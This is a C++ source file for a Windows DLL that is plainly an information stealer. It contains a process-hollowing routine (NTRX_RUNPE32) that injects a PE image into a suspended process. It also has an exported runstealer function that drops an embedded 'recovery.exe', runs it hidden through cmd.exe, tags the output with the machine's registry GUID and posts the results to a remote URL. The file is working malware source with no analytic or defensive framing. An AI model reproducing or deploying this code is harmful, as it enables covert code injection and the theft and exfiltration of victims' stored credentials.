#include "pch.h"
#include <stdio.h> 
#include <string>
#include <ShellAPI.h>
#include "DarkRequest.h"
#include "Stealer.h"
#include <Wincrypt.h>
#include <fstream>
#pragma warning(disable:4996)
#pragma comment(lib, "Crypt32")
extern "C"
{

	int NTRX_RUNPE32(void* Image, LPSTR cmd)
	{
		IMAGE_DOS_HEADER* DOSHeader;
		IMAGE_NT_HEADERS* NtHeader;
		IMAGE_SECTION_HEADER* SectionHeader;
		PROCESS_INFORMATION PI;
		STARTUPINFOA SI;
		CONTEXT* CTX;
		DWORD* ImageBase = NULL;
		void* pImageBase = NULL;
		int count;
		char CurrentFilePath[1024];
		DOSHeader = PIMAGE_DOS_HEADER(Image);
		NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
		GetModuleFileNameA(0, CurrentFilePath, 1024);
		if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
		{
			ZeroMemory(&PI, sizeof(PI));
			ZeroMemory(&SI, sizeof(SI));
			bool threadcreated = CreateProcessA(CurrentFilePath, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);
			if (threadcreated == true)
			{
				CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{
					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
						NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
					if (pImageBase == 00000000) {
						ResumeThread(PI.hThread);
						ExitProcess(NULL);
						return 1;
					}
					if (pImageBase > 0) {
						WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
						for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
						{
							SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
							WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
								LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
						}
						WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
							LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
						CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
						SetThreadContext(PI.hThread, LPCONTEXT(CTX));
						ResumeThread(PI.hThread);
						return 0;
					}
				}
			}
		}
	}

	static std::string GetMachineGUID()
	{
		std::string ret;
		char value[64];
		DWORD size = _countof(value);
		DWORD type = REG_SZ;
		HKEY key;
		LONG retKey = ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key);
		LONG retVal = ::RegQueryValueExA(key, "MachineGuid", nullptr, &type, (LPBYTE)value, &size);
		if (retKey == ERROR_SUCCESS && retVal == ERROR_SUCCESS) {
			ret = value;
		}
		::RegCloseKey(key);
		return ret;
	}

	__declspec(dllexport) void runstealer(std::string url)
	{
		DWORD Res;
		HANDLE hFile = CreateFile("recovery.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile) {
			return;
		}
		WriteFile(hFile, rawData, sizeof(rawData), &Res, NULL);
		CloseHandle(hFile);
		#define hide SW_HIDE 
		#if _DEBUG
		#define hide SW_SHOW 
		#endif

		char buffer[MAX_PATH];
		GetModuleFileName(NULL, buffer, MAX_PATH);
		std::string::size_type pos = std::string(buffer).find_last_of("\\/");
		
		std::string uuid = GetMachineGUID();
		LPTSTR cmdPath = (LPTSTR)"cmd.exe";
		std::string cmdArgs = "cmd.exe /C  "+std::string(buffer).substr(0, pos)+"\\recovery.exe > " + std::string(buffer).substr(0, pos) + "\\"+ uuid +".txt";
		ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, hide);
		//Sleep(30000);
		postRequest(uuid,url);

	}
}